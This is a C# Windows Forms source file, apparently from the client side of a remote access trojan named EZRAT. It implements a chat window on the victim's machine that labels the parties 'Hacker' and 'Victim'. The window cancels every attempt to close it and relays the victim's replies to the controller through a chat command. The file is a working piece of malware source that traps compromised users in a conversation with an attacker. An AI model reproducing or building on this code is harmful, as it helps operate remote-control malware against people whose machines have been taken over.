using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EZRATClient.Forms
{
    public partial class Chat : Form
    {

        private List<string> _texted =  new List<string>();

        public List<string> Texted
        {
            get { return _texted; }
            set { _texted = value; }
        }

        private string _serverName;

        public string ServerName
        {
            get { return _serverName + " : "; }
            set { _serverName = value; }
        }

        private string _victimName;

        public string VictimName
        {
            get { return _victimName + " : "; }
            set { _victimName = value; }
        }





        public Chat(string message = "")
        {
            InitializeComponent();
            this.btnSend.Click += SendMessage;
            this.FormClosing += CancelClosed;
            this.Text = "Chat";
            this.ServerName = "Hacker";
            this.VictimName = "Victim";
            if (message != "")
            {
                this.Texted.Add(this.ServerName + message);
                this.rtbMsg.Text += this.ServerName + message + Environment.NewLine;
            }
        }

        private void CancelClosed(object sender,FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void SendMessage(object sender,EventArgs e)
        {
            string msg = string.Empty;
            this.tbxMsg.Invoke(new MethodInvoker(() => msg = this.tbxMsg.Text));
            this.tbxMsg.Invoke(new MethodInvoker(() => this.tbxMsg.Text = string.Empty));
            this.Texted.Add(this.VictimName + msg);
            Program.SendCommand("chat;" + msg);
            AddMessage(msg,1);

        }


        public void NewMessage(string message)
        {
            if (message == "") return;
            this.Texted.Add(this.ServerName + message);
            AddMessage(message, 0);
        }


        private void AddMessage(string message,int user)
        {
            if (this.rtbMsg.InvokeRequired)
            {
                this.rtbMsg.Invoke(new MethodInvoker(() => this.rtbMsg.Text += ((user == 0) ? this.ServerName : this.VictimName) + message + Environment.NewLine));
            }
            else
            {
                this.rtbMsg.Text += ((user == 0) ? this.ServerName : this.VictimName) + message + Environment.NewLine;
            }
        }
    }
}
